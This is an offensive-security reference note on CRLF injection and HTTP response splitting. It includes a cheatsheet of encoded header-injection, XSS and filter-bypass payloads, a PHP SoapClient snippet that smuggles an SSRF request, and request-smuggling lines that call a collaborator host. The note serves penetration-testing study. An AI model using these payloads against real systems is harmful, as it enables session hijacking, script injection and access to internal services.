---
technique: "CRLF Injection & Response splitting"
family: "http-protocol"
severity_hint: "medium"
tags: []
source: "_raw/Web attacks/Web Attacks/HTTP Attacks/CRLF Injection & Response splitting.md"
source_sha256: "b40c443a2f07521b0dc380b88bb57ab9ba1861338473e3ba18b5f887166e46ae"
curator_version: 2
review_status: imported-unreviewed
---

# CRLF Injection & Response splitting

> Family: **http-protocol** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `jsx: $target = 'http://127.0.0.1:9090/test';`
- `jsx: GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20`

## Playbook (operator notes)

# CRLF Injection & Response splitting

[https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)

[https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

[](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt)

# CHEATSHEET

1. HTTP Response Splitting
    1. `/%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)`
2. CRLF chained with Open Redirect
    1.  `/www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2`
    2. `/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2`
    3. `/google.com/%2F..%0D%0AHeader-Test:test2`
    4. `/%0d%0aLocation:%20http://example.com`
3. CRLF Injection to XSS
    1. `/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23`
    2. `/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E`
4. Filter Bypass
    1. `%E5%98%8A = %0A = \u560a`
    2. `%E5%98%8D = %0D = \u560d`
    3. `%E5%98%BE = %3E = \u563e (>)`
    4. `%E5%98%BC = %3C = \u563c (<)`
    5. `Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test`

# Example: CRLF Injection in a Log File

[CRLF injection, HTTP response splitting & HTTP header injection | Invicti](https://www.invicti.com/blog/web-security/crlf-http-header/)

# HTTP Response Splitting

HTTP Response Splitting is a security vulnerability that arises when an attacker exploits the structure of HTTP responses. This structure separates headers from the body using a specific character sequence, Carriage Return (CR) followed by Line Feed (LF), collectively termed as CRLF. If an attacker manages to insert a CRLF sequence into a response header, they can effectively manipulate the subsequent response content. This type of manipulation can lead to severe security issues, notably Cross-site Scripting (XSS).

### XSS through HTTP Response Splitting

[#BugBounty — Exploiting CRLF Injection can lands into a nice bounty](https://infosecwriteups.com/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

1. The application sets a custom header like this: `X-Custom-Header: UserInput`
2. The application fetches the value for `UserInput` from a query parameter, say "user_input". In scenarios lacking proper input validation and encoding, an attacker can craft a payload that includes the CRLF sequence, followed by malicious content.
3. An attacker crafts a URL with a specially crafted 'user_input'
    1. `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
    2. In this URL, `%0d%0a%0d%0a` is the URL-encoded form of CRLFCRLF. It tricks the server into inserting a CRLF sequence, making the server treat the subsequent part as the response body.
4. The server reflects the attacker's input in the response header, leading to an unintended response structure where the malicious script is interpreted by the browser as part of the response body.

### Overwriting headers

Lastly, if the web application implements custom headers or uses headers to implement security measures such as `Clickjacking` protection or a `Content-Security-Policy (CSP)`, HTTP response splitting can lead to bypasses of these security measures as well.

# Exploiting CORS via HTTP Header Injection

HTTP Header Injection, often exploited through CRLF (Carriage Return and Line Feed) injection, allows attackers to insert HTTP headers. This can undermine security mechanisms such as XSS (Cross-Site Scripting) filters or the SOP (Same-Origin Policy), potentially leading to unauthorized access to sensitive data, such as CSRF tokens, or the manipulation of user sessions through cookie planting.

### Exploiting CORS via HTTP Header Injection

An attacker can inject HTTP headers to enable CORS (Cross-Origin Resource Sharing), bypassing the restrictions imposed by SOP. This breach allows scripts from malicious origins to interact with resources from a different origin, potentially accessing protected data.

### SSRF and HTTP Request Injection via CRLF

```jsx
$target = 'http://127.0.0.1:9090/test'; 
$post_string = 'variable=post value';
$crlf = array(
    'POST /proxy HTTP/1.1',
    'Host: local.host.htb',
    'Cookie: PHPSESSID=[PHPSESSID]',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: '.(string)strlen($post_string),
    "\r\n",
    $post_string
);

$client = new SoapClient(null,
    array(
        'uri'=>$target,
        'location'=>$target,
        'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
    )
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```

# Header Injection to Request Smuggling

Afterward, a second request can be specified. This scenario typically involves HTTP request smuggling, a technique where extra headers or body elements appended by the server post-injection can lead to various security exploits → Request Smuggling & HTTP Desync 

```jsx
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1
```

# Memcache Injection

[11211 - Pentesting Memcache](https://book.hacktricks.xyz/network-services-pentesting/11211-memcache)

---

[CRLF (%0D%0A) Injection](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)

## Source
Original note: `_raw/Web attacks/Web Attacks/HTTP Attacks/CRLF Injection & Response splitting.md`
